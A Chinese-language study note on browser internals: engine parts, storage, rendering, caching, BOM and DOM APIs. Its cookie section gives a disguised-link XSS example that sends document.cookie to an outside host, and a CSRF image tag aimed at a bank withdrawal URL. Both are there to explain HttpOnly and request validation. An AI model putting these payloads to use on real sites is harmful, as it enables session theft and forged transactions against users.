# browser

[How browsers work](https://web.dev/howbrowserswork/)

## 浏览器组成

1. User Interface：地址栏、前进/后退按钮...
2. The browser engine
3. The rendering engine
4. Networking
5. UI Backend
6. JavaScript Interpreter
7. Data storage

### JavaScript Interpreter

js 引擎包括 parser、解释器、gc 再加一个 JIT 编译器这几部分。

- parser： 负责把 JavaScript 源码转成 AST
- interperter：解释器， 负责转换 AST 成字节码，并解释执行
- JIT compiler：对执行时的热点函数进行编译，把字节码转成机器码，之后可以直接执行机器码
- gc（garbage collector）：垃圾回收器，清理堆内存中不再使用的对象

一般的 JS 引擎的编译流水线是 parse 源码成 AST，之后 AST 转为字节码，解释执行字节码。运行时会收集函数执行的频率，对于到达了一定阈值的热点代码，会把对应的字节码转成机器码（JIT），然后直接执行。

> 在游览器中有一个最重要的模块， 它主要的作用是将页面转变成可视化的图像结果， 这个模块就是游览器内核， **通常它也被称为渲染引擎**。

- IE：Trident
- safari：WebKit
- chrome：以前用 WebKit 的分支，现用 Blink
- opera：Presto（2013 年 2 月宣布放弃）现用 Blink
- Firefox：Gecko

### Data storage

#### Cookie

1. 对于传输部分少量不敏感数据，非常简明有效
2. cookie 分持久级别和 session 级别
   1. 不设置过期时间，默认是会话级别的 cookie，浏览器关闭就失效
3. cookie 一般用于和 session 通信
4. 不可跨域（设置 domain 可在二级域名下共享）
   1. domain 参数必须以`.`开始
5. 可设置路径，仅允许该路径下的网页访问
6. 大小不超过 4k;

安全：

1. HttpOnly
2. Secure

XSS：

```html
<a href="#" onclick=`window.location=http://abc.com?cookie=${docuemnt.cookie}`>领取红包</a>
```

可通过 HttpOnly 防止 js 操作 Cookie

CSRF：不同域名下使用地址

```html
<img src="http://www.bank.com/withdraw?user=shenyang&total=777" />
```

这时候会提交表单。可通过增加其他校验手段解决。

#### SessionStorage, LocalStorage

SessionStorage 和 LocalStorage 都是本地存储，不会被发送到服务器上。同时空间比 Cookie 大很多

http://dev-test.nemikor.com/web-storage/support-test/

#### indexDB

IndexedDb 提供了一个结构化的、事务型的、高性能的 NoSQL 类型的数据库，包含了一组同步/异步 API

[详情](./indexed-db)

#### PWA(Service Worker)

作为一个独立的线程，是一段在后台运行的脚本，可使 web app 也具有类似原生 App 的离线使用、消息推送、后台自动更新等能力

- 不能访问 DOM
- 不能使用同步 API
- 需要 HTTPS 协议

## BFCache

[back/forward cache](https://web.dev/bfcache/)，是浏览器为了在用户页面间执行前进后退操作时拥有更加流畅体验的一种策略。

1. 前往新页面时，将当前页面的快照（JavaScript heap）存在内存中
2. 点击后退按钮时，将页面直接从 bfcache 中加载，节省了时间
3. setTimeout、Promise 等任务都会保存状态并暂停，直到页面恢复

测试页面是否可用：DevTools -> Application -> Back/forward cache -> Test back/forward cache

## 进程与线程

> 进程和线程都是一个时间段的描述，是 CPU 工作时间段的描述

- 进程 process：进程就是时间总和=执行环境切换时间+程序执行时间-->CPU 加载执行环境->CPU 执行程序->CPU 保存执行环境
- 线程 thread：线程也是时间总和=执行环境切换时间（共享进程的）+程序模块执行时间-->CPU 加载执行环境（共享进程的）->CPU 执行程序摸块->CPU 保存执行环境（共享进程的）
- 进程和线程都是描述 CPU 工作的时间段，线程是更细小的时间段。

### 进程

> 程序的一次执行，它占有一片独有的内存空间， 是操作系统执行的基本单元

- 一个程序可以同时允许运行多个进程， 那么就是**多进程**
- 一个进程内的数据可以供其中的多个线程直接共享， 多个进程之间的数据是不能直接共享的

浏览器进程

- Browser 进程:
  - 浏览器的主进程,负责浏览器界面的显示,和各个页面的管理,
  - 浏览器中所有其他类型进程的祖先,负责其他进程的的创建和销毁
  - 只有一个
- Renderer 进程:
  - 网页渲染进程,负责页面的渲染,可以有多个
  - 当然渲染进程的数量不一定等于你开打网页的个数
- NPAPI 插件进程
- Pepper 插件进程
- GPU 进程
- 移动设备的浏览器可能不太一样:
  - Android 不支持插件，所以就没有插件进程
  - GPU 演化成了 Browser 进程的一个线程
  - Renderer 进程演化成了操作系统的一个服务进程,它仍然是独立的

### 线程

> 是进程内的一个独立执行单元， 是 CPU 调度的最小单元， 程序运行的基本单元

- 一个进程中至少有一个运行的线程： **主线程**，进程启动后自动创建
- 一个进程中也可以同时运行多个线程，我们会说程序是多线程运行的
- 线程池（thread pool）：保存多个线程对象的容器
- JS 引擎是单线程运行的
  多线程：

- 多线程的目的主要是保持用户界面的高度响应，为了不让 Browser 进程的 UI 线程被其他耗时的操作(数据库读写,本地文件读写)所阻塞，就把这些操作放到分线程中去处理
- 在 Renderer 进程中，为了不让其他操作阻止渲染线程的高速执行,我们通常会将渲染过程管线化,利用计算机的多核优势,让渲染的不同阶段在不同的线程中执行

## 页面渲染

[When does it start? - navigation start in webperf specs](https://docs.google.com/document/d/1XjmlMpbPgQkBpj_sayrXyiyyImPiL0wyueWfiuD7bk0/)

[从输入 URL 到页面加载完成的过程中都发生了什么事情？](https://fex.baidu.com/blog/2014/05/what-happen/)

1. unload 上个页面/新建
2. 开启网络线程到发出一个完整的 http 请求
   1. 缓存
   2. 重定向（如果有）
   3. DNS：查询得到 IP，用 dns-prefetch 优化
   4. TCP
      - 3 次握手规则简历连接，以及断开连接时候的 4 次挥手
      - 同域名的并发限制（http1.0）
   5. 请求 document，请求到达服务器。（均衡负载，安全拦截，服务器内部处理）
   6. document 响应
      1. http 头、响应码、报文结构、cookie：静态资源无需 cookie
      2. 开始解析 document：下载、解析、渲染是并行的，但是并行有一定粒度，即当解析的字节数到达一个临界值时，就开始渲染，以达到渐进式渲染效果
3. 请求 js、css
4. [解析](#渲染过程)
   1. 构建 DOM tree
   2. 计算样式
   3. 布局计算
   4. 图层
   5. 绘制
5. dom 可以交互

具体时长可以用 [performance](https://developer.mozilla.org/en-US/docs/Web/API/Performance) 进行监听。推荐使用 [sentry](https://github.com/getsentry/sentry-javascript) 和 [cloudflare](https://dash.cloudflare.com/) 进行页面监听。

[网络协议](./http#网络协议)

### 浏览器的一帧

[文档](https://html.spec.whatwg.org/multipage/webappapis.html#event-loop-processing-model)

1. 清除旧任务对戏那个
2. start
3. microtask
4. requestAnimationFrame
5. reflow/repaint

一个 task(宏任务) -- 队列中全部 job(微任务) -- requestAnimationFrame -- 浏览器重排/重绘 -- requestIdleCallback（每次 check 结束发现距离下一帧的刷新还有时间，就执行一下这个。如果时间不够，就下一帧再说）

两个常见的卡顿场景：

- CPU 工作时间在 16ms 以内，但是需要操作大量的原生 DOM 更新操作（例如，挂在大量新的 DOM 内容）。由于大量 DOM 更新，导致的卡顿。
- CPU 工作时间超过 16ms 的时间。导致渲染无法完成。

### 渲染过程

1. Structure - 构建 DOM 树的结构
2. Layout - 确认每个 DOM 的大致位置（排版）
3. Paint - 绘制每个 DOM 具体的内容（绘制）

浏览器渲染页面的整个过程：浏览器会从上到下解析文档。

1. 构建 DOM 树：遇见 HTML 标记，调用 HTML 解析器解析为对应的 token （一个 token 就是一个标签文本的序列化）并构建 DOM 树（就是一块内存，保存着 tokens，建立它们之间的关系）
   1. Conversion：浏览器从网络或磁盘读取 HTML 文件原始字节（Bytes），根据指定的文件编码（如 UTF-8）将字节转换成字符。
   2. Tokenizing：浏览器根据[HTML 规范](https://html.spec.whatwg.org/multipage/parsing.html#parsing)将字符串转换为不同的标记（如 `<html>`, `<body>`）
   3. Lexing：上一步产生的标记将被转换为对象，这些对象包含了 HTML 语法的各种信息，如属性、属性值、文本等。
   4. DOM construction：因为 HTML 标记定义了不同标签之间的关系，上一步产生的对象会链接在一个树状数据结构中，以标识父项-子项关系。
2. 样式计算：遇见 style/link 标记 调用 css 解析器 处理 CSS 标记并构建 CSSOM 树
   1. 格式化样式表：字节流转换为 styleSheets，可以访问 document.styleSheets 查看。
   2. 收集、划分和索引所有样式表中存在的样式规则，并标准化（如 red -> rgb(255, 0, 0)）
   3. 访问每个元素并找到适用于该元素的所有规则，CSS 引擎遍历 DOM 节点，进行选择器匹配，并为匹配的节点执行样式设置
   4. 结合层叠规则和其他信息为节点生成最终的计算样式，这些样式的值可以通过 `window.getComputedStyle()` 获取。
3. 遇见 script 标记 调用 JS 解析器 处理 script 标记，绑定事件、修改 DOM 树/CSSOM 树等
4. 将 DOM 与 CSSOM 合并成一个渲染树（Layout）
   1. 从 DOM 树的根节点开始遍历每个可见节点。
      - 某些不可见节点（例如 script、head、meta 等），它们不会体现在渲染输出中，会被忽略。
      - 某些通过设置 display 为 none 隐藏的节点，在渲染树中也会被忽略。
      - 为伪元素创建 LayoutObject。
      - 为行内元素创建匿名包含块对应的 LayoutObject。
   2. 对于每个可见节点，为其找到适配的 CSSOM 规则并应用它们。
   3. 产出可见节点，包含其内容和计算的样式。
5. 根据渲染树来布局，以计算每个节点的几何信息。
   1. 根据 CSS 盒模型及视觉格式化模型，计算每个元素的各种生成盒的大小和位置。
   2. 计算块级元素、行内元素、浮动元素、各种定位元素的大小和位置。
   3. 计算文字，滚动区域的大小和位置。
   4. LayoutObject 有两种类型：
      - 传统的 LayoutObject 节点，会把布局运算的结果重新写回布局树中。
      - LayoutNG（Chrome 76 开始启用） 节点的输出是不可变的，会保存在 NGLayoutResult 中，这是一个树状的结构，相比之前的 LayoutObject，少了很大回溯计算，提高了性能。
6. 将各个节点绘制到屏幕上。

> 这几个步骤并不一定按顺序执行完成。如果 DOM 或 CSSOM 被修改，以上过程需要重复执行，这样才能计算出哪些像素需要在屏幕上进行重新渲染。
> 实际页面中，CSS 与 JavaScript 往往会多次修改 DOM 和 CSSOM

阻塞渲染

- html 资源
  - 调用 html 解析器解析的，异步非阻塞
- css 资源
  - 调用 css 解析器解析的
  - 使用 style 标签，是异步非阻塞
  - 使用 link 标签，是同步阻塞
  - **问题**: `<u>闪屏</u>`：通过 link 标签引入样式解决，性能更高（减少重绘重排），缺点首屏渲染速度更慢
- js 阻塞

  - 内部 js/外部引入的 js，都是同步阻塞的
  - 直接引入的 js 会阻塞页面的渲染
    JavaScript 代码可能会修改 DOM 树的结构
  - js 顺序执行，阻塞后续 js 逻辑的执行，不阻塞 js 等其他资源的加载

  维护依赖关系

  - 预解析
    WebKit 和 Firefox 都进行了这项优化。在执行 js 脚本时，其他线程会解析文档的其余部分，
    找出并加载需要通过网络加载的其他资源。通过这种方式，资源可以在并行连接上加载，从而提高总体速度。预解析器不会修改 DOM 树，而是将这项工作交由主解析器处理；
    预解析器只会解析外部资源（例如外部脚本、样式表和图片）的引用。

> 在上述的过程中，网页在加载和渲染过程中会发出“DOMContentloaded”和“load”事件
> 分别在 DOM 树构建完成之后，以及 DOM 树构建完并且网页所依赖的资源都加载完之后发生、
> 因为某些资源的加载并不会阻碍 DOM 树的创建，所以多数是不同时发生的
> Load 事件触发代表页面中的 DOM，CSS，JS，图片已经全部加载完毕。
> DOMContentLoaded 事件触发代表初始的 HTML 被完全加载和解析，不需要等待 CSS，JS，图片加载。

从 DOM 树到可视化图像

1. CSS 文件被 CSS 解析器解释成内部表示结构(CSSDOM)
2. CSS 解析器工作完成之后，在 DOM 树上附加解释后的样式信息，这就是 RenderObject 树
3. RenderObject 在创建的同时，Webkit 会根据网页的结构创建 RenderLayer，同时构建一个绘图上下文
4. 根据绘图上下文生成最终的图像（这一过程需要依赖图形库）

上面是一个完整的渲染过程，但现代网页很多都是动态的，这意味着在渲染完成之后，由于网页的动画或者用户的交互，浏览器其实一直在不停地重复执行渲染过程。（重绘重排），以上的数字表示的是基本顺序，这不是严格一致的，这个过程可能重复也可能交叉

### 图层

> 浏览器在渲染一个页面时，会将页面分为很多个图层，图层有大有小，每个图层上有一个或多个节点。

在渲染 DOM 的时候，浏览器所做的工作实际上是：

1. 获取 DOM 后分割为多个图层
   - 对每个图层的节点计算样式结果 （Recalculate style--样式重计算）
   - 为每个节点生成图形和位置 （Layout--重排,回流）
   - 将每个节点绘制填充到图层位图中 （Paint--重绘）
2. 图层作为纹理上传至 GPU
3. 符合多个图层到页面上生成最终屏幕图像 （Composite Layers--图层重组）

### 图层创建的条件

1. 拥有具有 3D 变换的 CSS 属性：translate3d、translateZ
2. 使用加速视频解码的`<video>`节点
3. `<canvas>`节点
4. CSS3 动画的节点：opacity
5. 拥有 CSS 加速属性的元素(will-change)
6. 元素有一个 z-index 较低且包含一个复合层的兄弟元素（换句话说就是该元素在复合层上面渲染）
   你在图层上渲染，有一个 z-index 较低兄弟元素，而且这个兄弟元素本身就是一个图层，性能更高

### Repaint

> 重绘是一个元素外观的改变所触发的浏览器行为，浏览器会根据元素的新属性重新绘制
> 使元素呈现新的外观。重绘不会带来重新布局，所以并不一定伴随重排。

- 图层中某个元素需要重绘，那么整个图层都需要重绘（比如一个图层包含很多节点，其中有个 gif 图，gif 图的每一帧，都会重回整个图层的其他节点，然后生成最终的图层位图，所以这需要通过特殊的方式来强制 gif 图属于自己一个图层（translateZ(0)或者 translate3d(0,0,0)，CSS3 的动画也是一样（好在绝大部分情况浏览器自己会为 CSS3 动画的节点创建图层））

### Reflow

> 渲染对象在创建完成并添加到渲染树时，并不包含位置和大小信息。计算这些值的过程称为布局或重排

- "重绘"不一定需要"重排"，比如改变某个网页元素的颜色，就只会触发"重绘"，不会触发"重排"，因为布局没有改变。
- 但是，"重排"必然导致"重绘"，比如改变一个网页元素的位置，就会同时触发"重排"和"重绘"，因为布局改变了。

### 触发重排的操作

> Reflow 的成本比 Repaint 的成本高得多的多。DOM Tree 里的每个结点都会有 reflow 方法，
> 一个结点的 reflow 很有可能导致子结点，甚至父点以及同级结点的 reflow

### 优化

> 如果我们需要使得动画或其他节点渲染的性能提高，需要做的就是减少浏览器在运行时所需要做的工作（减少 1234 中的步骤）

1. 元素位置移动变换时尽量使用**CSS3 的 transform**来代替对 top left 等的操作，变换（transform）和透明度（opacity）的改变仅仅影响图层的组合
2. 使用 opacity 来代替 visibility，透明度不会触发重绘，透明度的改变时，GPU 在绘画时只是简单的降低之前已经画好的纹理的 alpha 值来达到效果，并不需要整体的重绘，这个前提是这个被修改 opacity 本身必须是一个图层，如果图层下还有其他节点，GPU 也会将他们透明化
3. 不要使用 table 布局，table-cell
4. 将多次改变样式属性的操作**合并成一次操作**（class），不要一条一条地修改 DOM 的样式，预先定义好 class，然后修改 DOM 的 className
5. 将 DOM 离线后再修改，由于**display 属性为 none**的元素不在渲染树中，对隐藏的元素操作不会引发其他元素的重排。
   - 如果要对一个元素进行复杂的操作时，可以先隐藏它，操作完成后再显示。这样只在隐藏和显示时触发 2 次重排。
6. 利用文档碎片 `document.createDocumentFragment()`
7. 不要把某些 DOM 节点的属性值放在一个循环里当成循环的变量
   - 当你请求向浏览器请求一些 style 信息的时候，就会让浏览器 flush 队列，比如：
8. 动画实现过程中，启用 GPU 硬件加速(3d)，为动画元素新建图层，提高动画元素的 z-index

#### 字体加载优化

```css
div {
  /* 立即使用默认字体，字体文件加载完成后立即更换 */
  font-display: swap;
}
```

## 缓存

1. Service Worker
2. Memory Cache
3. Disk Cache
4. Push Cache（HTTP/2，只在会话（Session）中存在，一旦会话结束就被释放）
5. 网络请求

### 强缓存(200 from cache)

- Expires：服务端将资源失效的日期告知客户端，Expires 和 Cache-Control 同时存在的时候，Cache-Control 优先
- cache-control（http 1.1）：

  - max-age[秒] | 响应的最大 age 值
  - no-cache | 缓存前必须先确认其有效性
  - no-store | 不缓存请求或响应的任何内容
  - private | 只有浏览器能缓存了，中间的代理服务器不能缓存

> Expires 使用的是服务器端的时，但是有时候会客户端时间和服务端不同步，推荐用 Max-Age

### 协商缓存(304)

- last-modified（响应）& if-modified-since（请求）

  - last-modified：服务器在响应请求时，会告诉浏览器资源的最后修改时间
  - if-modified-since：浏览器再次请求服务器的时候，请求头会包含此字段，后面跟着在缓存中获得的最后修改时间。服务端收到此请求头发现有 if-Modified-Since，则与被请求资源的最后修改时间进行对比，如果一致则返回 304 和响应报文头，浏览器只需要从缓存中获取信息即可。

  第一次请求资源时，资源在响应头中种入 last-modified 字段，并随着响应体一起存到缓存中

- If-None-Match/E-tag
  - etag：服务器响应请求时，通过此字段告诉浏览器当前资源在服务器生成的唯一标识（生成规则由服务器决定）
  - if-None-Match：再次请求服务器时，浏览器的请求报文头部会包含此字段，后面的值为在缓存中获取的标识。服务器接收到次报文后发现 If-None-Match 则与被请求资源的唯一标识进行对比。

## requestAnimationFrame

requestAnimationFrame 是每次 loop 结束发现需要渲染，在渲染之前执行的一个回调函数，不是宏微任务。

- `window.requestAnimationFrame(callback)`

- 电脑显示器有刷新频率，大多数浏览器都会对重绘操作加以限制，不超过显示器的重绘频率，因为即使超过那个频率用户体验也不会有提升。
- setTimeout 和 setInterval 都不精确。它们的内在运行机制决定了时间间隔参数实际上只是指定了把动画代码添加到浏览器 UI 线程队列中以等待执行的时间。如果队列前面已经加入了其他任务，那动画代码就要等前面的任务完成后再执行
- requestAnimationFrame 采用系统时间间隔，保持最佳绘制效率，让各种网页动画效果能够有一个统一的刷新机制
- requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率
- 在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的 CPU、GPU 和内存使用量
- requestAnimationFrame 是由浏览器专门为动画提供的 API，在运行时浏览器会自动优化方法的调用，并且如果页面不是激活状态下的话，动画会自动暂停，有效节省了 CPU 开销

```js
const element = document.getElementById('some-element-you-want-to-animate');
let start, previousTimeStamp;
let done = false;

function step(timestamp) {
  if (start === undefined) {
    start = timestamp;
  }
  const elapsed = timestamp - start;

  if (previousTimeStamp !== timestamp) {
    // Math.min() is used here to make sure the element stops at exactly 200px
    const count = Math.min(0.1 * elapsed, 200);
    element.style.transform = `translateX(${count}px)`;
    if (count === 200) done = true;
  }

  if (elapsed < 2000) {
    // Stop the animation after 2 seconds
    previousTimeStamp = timestamp;
    if (!done) {
      window.requestAnimationFrame(step);
    }
  }
}

window.requestAnimationFrame(step);
```

## 执行 innerHTML 里的 `<script>`

之前在做公司的一个抽奖模板的需求时遇到了 innerHTML 里的 `<script>`标签不执行的情况，即脚本不被解析。

### appendChild

appendChild 把`<script>`标签直接塞进页面是可以执行和加载里面的 js 的，我们需要做的就只是把所有的`<script>`找出来，然后通过 appendChild 塞到页面里，需要注意的是`script`的加载和执行并非是同步的。为了流程的控制，在执行 js 的时候，可以使用 promise 来控制。

### JQuery.html()

jQuery 会对代码进行正则判断，符合条件就会使用 jQuery 的 `append`

### createContextualFragment

该方法通过调用 HTML 片段解析算法或 XML 片段解析算法返回一个文档片段

```js
const range = document.createRange();
// make the parent of the first div in the document becomes the context node
range.selectNode(document.body);
const documentFragment = range.createContextualFragment(innerHtml);
document.body.appendChild(documentFragment);
```

### 重新触发 DOMContentLoaded

```js
const DOMContentLoadedEvent = document.createEvent('Event');
DOMContentLoadedEvent.initEvent('DOMContentLoaded', true, true);
document.dispatchEvent(DOMContentLoadedEvent);
```

## rel

a 标签增加`rel="noopener noreferrer"`属性：

```html
<a href="href" target="_blank" rel="noopener noreferrer">链接</a>
```

则新页面的 window.opener 属性就为 null，如果不设置，则 window.opener 就是打开的前一个页面的 window 对象

> rel=noreferrer 是为了兼容旧浏览器

## polyfill

### intersection-observer

[intersection-observer](https://github.com/GoogleChromeLabs/intersection-observer)

polyfills the native [`IntersectionObserver`](http://w3c.github.io/IntersectionObserver/) API in unsupporting browsers. See the [API documentation](https://developer.mozilla.org/en-US/docs/Web/API/Intersection_Observer_API) for usage information.

## HTMLCollection 和 NodeList

### HTMLCollection

Element 的集合，获取到后值会实时改变。

返回 HTMLCollection

- getElementByTagName() and
- getElementsByClassName()

### NodeList

DOM 抽象类 [Node] 组成的集合，一般是 Docuemnt、ELement、DocumentFragment 的子类

包含了 element nodes, attribute nodes, text nodes

返回 NodeList：

- Node.childNodes and methods such as
- document.querySelectorAll()
- document.getElementsByName

document.querySelectorAll() 的 NodeList 结果获取后不会再修改。

## 阻止浏览器关闭

```js
window.isCloseHint = true;
//初始化关闭
window.addEventListener('beforeunload', (e) => {
  if (window.isCloseHint) {
    const confirmationMessage = '要记得保存！你确定要离开我吗？';
    (e || window.event).returnValue = confirmationMessage; // 兼容 Gecko + IE
    return confirmationMessage; // 兼容 Gecko + Webkit, Safari, Chrome
  }
});
```

## BOM

浏览器对象模型(Browser Object Model)，简称 BOM。BOM 提供了独立于内容而与浏览器窗口进行交互的对象。

### window

Global 对象。表示一个包含 DOM 文档的窗口，其 document 属性指向窗口中载入的 DOM 文档。使用 document.defaultView 属性可以获取指定文档所在窗口。

如果希望代码能兼容 node 和 browser，可使用 globalThis

```js
document.defaultView === window; // true
```

- document 对象代表浏览器中页面
- history 对象包含用户所访问过的页面的历史信息
- navigator 对象包含浏览器自身相关信息
- screen 对象包含了客户端计算机显示器显示能力的信息
- location 对象包含了浏览器所加载的当前页面的 URL 的详细信息
- window.window：窗口自身
- window.closed：窗口是否关闭

- window.onload()
- window.open(URL, name, specs, replace)

### iframe

防止网页被 iframe 内嵌

- `window.self !== window.top`：当顶层窗口不是自己，则被嵌入 iframe
- X-Frame-Options header

iframe 的[postMessage](./http#postMessage)

### 原生方法被覆盖

js 的原生方法被覆盖后，可以创建一个新的 window 对象，然后从新的 window 对象里面获取原生的方法，来重新赋值。

#### iframe

创建一个 iframe 对象，获取 iframe 中的 window 对象

```js
const iframe = document.createElement('iframe');
document.body.appendChild(iframe);
const iframeWin = iframe.contentWindow;
window.console = iframeWin.console;
```

#### window.open

window.open 方法调用会打开一个新的窗口，返回一个新的 window 对象

```js
const win = window.open(); // 获取对象
win.close(); //将打开的窗口关闭
window.console = win.console;
```

### base64

从 IE10+浏览器开始，所有浏览器就原生提供了 Base64 编码解码方法

```js
// 解码
const decodedData = window.atob(encodedData);
// 编码
let encodedData = window.btoa(decodedData);
```

> 注意：window.btoa 方法仅支持 Latin1 编码，不支持中文，需要先用 encodeURIComponent 转码

### location

- hash 设置或返回从井号 (#) 开始的 URL（锚）
- host 设置或返回主机名和当前 URL 的端口号
- hostname 设置或返回当前 URL 的主机名
- href 设置或返回完整的 URL
- pathname 设置或返回当前 URL 的路径部分
- port 设置或返回当前 URL 的端口号
- protocol 设置或返回当前 URL 的协议
- search 设置或返回从问号 (?) 开始的 URL（查询部分）

### navigator

可由 navigator 对象了解浏览器的种类，版本号，用户计算机的操作系统。常用于确保将用户导向与其使用的浏览器相兼容的页面上。

> navigator 的信息可以很容易地被修改，所以 JavaScript 读取的值不一定是正确。

- appCodeName 返回浏览器的代码名
- appName 返回浏览器的名称
- appVersion 返回浏览器的平台和版本信息
- cookieEnabled 返回指明浏览器中是否启用 cookie 的布尔值
- onLine 返回指明系统是否处于脱机模式的布尔值
- platform 返回运行浏览器的操作系统平台
- userAgent 返回由客户机发送服务器的 user-agent 头部的值（浏览器版本）
- share 调用浏览器分享组件

#### navigator.geolocation

提供设备位置信息，设备用户会被询问是否提供位置信息。

```js
const options = {
  enableHighAccuracy: true,
  timeout: 5000,
  maximumAge: 0,
};

function success(pos) {
  const crd = pos.coords;

  console.log('Your current position is:');
  console.log(`Latitude : ${crd.latitude}`);
  console.log(`Longitude: ${crd.longitude}`);
  console.log(`More or less ${crd.accuracy} meters.`);
}

function error(err) {
  console.warn(`ERROR(${err.code}): ${err.message}`);
  // ERROR(1): User denied Geolocation
}

navigator.geolocation.getCurrentPosition(success, error, options);
```

### screen

屏幕的信息

- screen.width：屏幕宽度，以像素为单位
- screen.height：屏幕高度，以像素为单位
- screen.colorDepth：返回颜色位数，如 8、16、24
- screen.pixelDepth

### document

表示任何在浏览器中载入的网页，并作为网页内容的入口。

- getElementById()：根据 id 获得 DOM 节点
- getElementsByTagName()：和按 Tag 名称获得一组 DOM 节点。
- cookie
  - httpOnly

很多与 HTML 文档相关的属性:

- forms 数组
- images 数组
- links 数组

### history

#### 前端路由

单页面应用 SPA 开发模式，在路由切换时替换 DOM Tree 中最小修改的部分 DOM，来减少原先因为多页应用的页面跳转带来的巨量性能损耗。它们都有自己的典型路由解决方案，@angular/router、react-router、vue-router。

这些路由插件总是提供两种不同方式的路由方式： Hash 和 History，有时也会提供非浏览器环境下的路由方式 Abstract，在 vue-router 中是使用了外观模式将几种不同的路由方式提供了一个一致的高层接口，让我们可以更解耦的在不同路由方式中切换。

Hash 和 History 除了外观上的不同之外，还一个区别是：Hash 方式的状态保存需要另行传递，而 HTML5 History 原生提供了自定义状态传递的能力，我们可以直接利用其来传递信息。

Hash 方法是在路由中带有一个 `#`，主要原理是通过监听 `#` 后的 URL 路径标识符的更改而触发的浏览器 `hashchange` 事件，然后通过获取 `location.hash` 得到当前的路径标识符，再进行一些路由跳转的操作，参见 [MDN](https://link.juejin.im/?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FEvents%2Fhashchange)

1. `location.href`：返回完整的 URL
2. `location.hash`：返回 URL 的锚部分
3. `location.pathname`：返回 URL 路径名
4. `hashchange` 事件：当 `location.hash` 发生改变时，将触发这个事件

**注意：** Hash 方法是利用了相当于页面锚点的功能，所以与原来的通过锚点定位来进行页面滚动定位的方式冲突，导致定位到错误的路由路径，因此需要采用别的办法，之前在写 [progress-catalog](https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2FSHERlocked93%2Fprogress-catalog) 这个插件碰到了这个情况。

[HTML5 提供了一些路由操作的 Api](https://developer.mozilla.org/en-US/docs/Web/API/History_API)

## console

- [不打开 DevTools 时，console.log 是否内存泄漏](https://blog.rexskz.info/getting-to-bottom-will-console-log-cause-memory-leak-when-devtools-is-off.html)：Chromium 对 console.log 总大小限制失效的原因，是因为其在判断时没有使用合适的方式，导致预估大小与实际大小严重不符。

## DOM

[Document Object Model (DOM)](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction)

HTML 和 XML 文档的编程接口。它提供了对文档的结构化的表述，并定义了一种方式可以使从程序中对该结构进行访问，从而改变文档的结构，样式和内容。DOM 将文档解析为一个由节点和对象（包含属性和方法的对象）组成的结构集合。

整个 HTML 对象被称为文档（document），文档节点是每个文档的根节点。

- document.title：浏览器标题
- document.URL：当前网页的 URL（只读）
- document.domain：网页域名
- document.referrer：链接到当前网页的 URL（只读）
- element.outHTML：该元素字符串形式的值

### class

- 直接操作: `document.querySelector("div").className = "class1 class2 class3";`
- 添加: `dom.classList.add`
- 移除: `dom.classList.remove`
- 判断: `dom.classList.contains`
- 切换: `dom.classList.toggle`

### property、attribute、自定义属性

- property 是 DOM 中的属性，是 JavaScript 里的对象
- attribute 是 HTML 标签上的特性
  - getAttribute("name")
  - setAttribute("name",value)
  - removeAttribute("name")
- HTML5 增加了一项新功能是， `data-*` 自定义属性
  - `el.dataset.attr = null`
  - `delete el.dataset.attr`

> attributes 是属于 property 的一个子集，它保存了 HTML 标签上定义属性

### 操作 DOM

#### get

- document.body：body
- document.head：head
- document.documentElement：html

- document.getElementById
- document.getElementsByTagName
- document.getElementsByClassName()(通用性差)
- querySelector()：通过 selector ，返回元素
- querySelectorAll()：通过 selector 语法来获取，返回伪数组。不动态更新

获取元素的相关节点

- ownerDocument：整个文档节点（所有节点都有该属性）
- childNodes：获取所有子节点的伪数组集合（动态更新）
- children：获取某个元素的所有子元素（只能获取，不能设置，返回动态更新的 HTMLCollection），ie6-8 支持但会错误的将注释节点包含进去
- firstChild：第一个子节点
- firstElementChild：第一个子元素（children[0]）
- lastChild：最后一个子节点
- lastElementChild：最后一个子元素
- previousSibling：上一个兄弟节点
- previousElementSibling：上一个兄弟元素
- nextSibling：下一个兄弟节点
- nextElementSibling：下一个兄弟元素
- parentNode：父节点
- parentElement：父元素

scrollWidth：获取盒子内容的高度（content+padding，如果 content 超出盒子也算在内）
scrollHeight：获取盒子内容的宽度（content+padding，如果 content 超出盒子也算在内）

scrollLeft：水平滚动条滚动的距离
scrollTop：垂直滚动条滚动的距离

window.pageXoffset：获取页面滚动距离特用（window.scrollX）
window.pageYoffset：获取页面滚动距离特用（window.scrollY）

ie6-8：documentElement.scrollTop 去获取 html 的 scrollTop

#### add

- document.write('label')：（只能向 document 添加，如果在事件中使用，会覆盖源元素）
- innerHTML：会覆盖原内容，并且有安全隐患（可向文档中传入不知名代码）
- document.createElement('label')：功能：创建一个标签
- document.createDocumentFragment()：创建文档片段，不是真实 DOM 树的其中一部分，它的变化不会引起 DOM 树的重新渲染操作(reflow)
- document.implementation.createDocument(namespaceURI, qualifiedNameStr, documentType)
- appendChild
- insertBefore
- before() & after()：`before()`是个`ChildNode`方法，也就是节点方法。节点方法对应于元素方法。区别在于，节点可以直接是文本节点，甚至注释等。但是，元素必须要有 HTML 标签。因此，`before()`的参数既可以是 DOM 元素，也可以是 DOM 节点，甚至可以直接字符内容。不支持解析 html 代码。
- append()：在某节点插入内容

#### update

- innerHTML：这设置或获取 HTML 语法表示的元素的后代。如果写入的字符串是通过网络拿到的，要注意对字符编码来避免 XSS 攻击。
- innerText 或 textContent 属性：一个节点及其后代的“渲染”文本内容，innerText 不返回隐藏元素的文本，而 textContent 返回所有文本。
- insertAdjacentText(position, element)：将一个给定的文本节点插入在相对于被调用的元素给定的位置
- insertAdjacentHTML(position, text)：将指定的文本解析为 HTML 或 XML，并将结果节点插入到 DOM 树中的指定位置。它不会重新解析它正在使用的元素，因此它不会破坏元素内的现有元素。这避免了额外的序列化步骤，使其比直接 innerHTML 操作更快

#### copy

node.cloneNode(deep)：在内存中克隆了一个节点
deep:可选。默认是 false。设置为 true，克隆节点以及后代以及其内容；设置为 false，只克隆父节点的标签，子节点不复制

克隆出来的节点和原来的节点没有关系

#### delete

要删除一个节点，首先要获得该节点本身以及它的父节点，然后，调用父节点的 removeChild() 把自己删掉

parentNode.removeChild(childNode)；

删除后的节点虽然不在文档树中了，但其实它还在内存中，可以随时再次被添加到别的位置。

```js
// 拿到待删除节点:
